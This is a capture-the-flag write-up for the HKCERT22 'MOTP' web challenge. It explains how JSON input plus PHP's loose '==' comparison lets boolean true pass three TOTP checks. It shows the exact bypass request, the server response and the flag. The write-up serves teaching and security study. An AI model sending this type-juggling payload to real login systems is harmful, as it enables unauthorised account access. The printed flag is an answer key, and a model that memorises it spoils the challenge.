# MOTP **(火炭 OTP)**

> Tag: web, 150 points
>
> Web: <http://chal.hkcert22.pwnable.hk:28305/>
> 
> Attachment: [motp_1ea0c63eb5566bc147f61f1cdf594984.zip](https://file.hkcert22.pwnable.hk/motp_1ea0c63eb5566bc147f61f1cdf594984.zip)

## Challenge Description

The [challenge website](http://chal.hkcert22.pwnable.hk:28305) contains a form
which asks for the username, password and three one-time passwords (OTP).
Clicking "Sign In" sends a POST request to `/login.php`, which then responds with
which field is incorrect.

![The result of a form submission.](./description.png)

The goal is to enter the correct username and password, and bypass the OTP checks.

## Code Analysis

From the source code of `login.php`, we can see that:
1. the form data is loaded into `$_DATA` by `jsonhandler.php`,
1. the username and password are checked against `$USER_DB`,
1. the OTPs are verified with randomly generated keys using `Google2FA`, and
1. the flag is revealed if all checks pass.

It is obvious that the username and password are `admin`.

`Google2FA` implements the time-based OTP algorithm,
possibly capatible with Google's Autheticator app.

## Failed Attempt

Since the interval between key regeneration is 30 seconds and the OTP length is 6,
we thought it might be possible to brute-force all three OTP under the time constraint.

However, although the three OTP can be sequentially brute-forced, this was proven to be
difficult as 30 seconds is not enough to pull this off.

## Finding the Bug
### JSON Input

We then noticed that the form data `$_DATA` comes from `json_decode`,
and that there are no validation on the input JSON.

```php
$_DATA = json_decode(file_get_contents('php://input'), true);
```

Since PHP is a loosely typed language, we can send data with a type other than string.
We can therefore control the type of fields in `$_DATA`.

### Loosely Typed Equality

We further found that OTP is compared using a `==` operator:

```php
public static function verify_key($b32seed, $key, $window = 4, $useTimeStamp = true) {
    // ...
    for ($ts = $timeStamp - $window; $ts <= $timeStamp + $window; $ts++)
        if (self::oath_hotp($binarySeed, $ts) == $key)
            return true;

    return false;
}
```

which is, [indeed](https://www.php.net/manual/en/language.operators.comparison.php),
an "equal" operator similar to JavaScript.
Instead of the identical (`===`) operator, which returns `false` if the operand types differ,
the equal (`==`) operator first performs some type juggling.

In particular, if one of the operand is of `bool` type, `==` will convert the other to
`bool` type as well before comparison.
So if we set `$key` to `true`, `self::oath_hotp($binarySeed, $ts) == $key` will evaluate to
`true` as the left operand is always [truthy](https://www.php.net/manual/en/language.types.boolean.php#language.types.boolean.casting).

## Solution

We therefore set the three OTP to be `true` and send the following HTTP request:

```http
POST /login.php HTTP/1.1
Host: chal.hkcert22.pwnable.hk:28305
Content-Length: 109

{
    "username":"admin",
    "password":"admin",
    "otp1":true,
    "otp2":true,
    "otp3":true
}
```

The response lastly contains the flag:

```http
HTTP/1.1 200 OK
Date: Mon, 14 Nov 2022 10:34:10 GMT
Server: Apache/2.4.54 (Debian)
X-Powered-By: PHP/8.1.12
Content-Length: 86
Content-Type: application/json

{"message":"Congrats, here is your flag: hkcert22{mistakes-off-the-page}","data":null}
```

## Flag
```
hkcert22{mistakes-off-the-page}
```
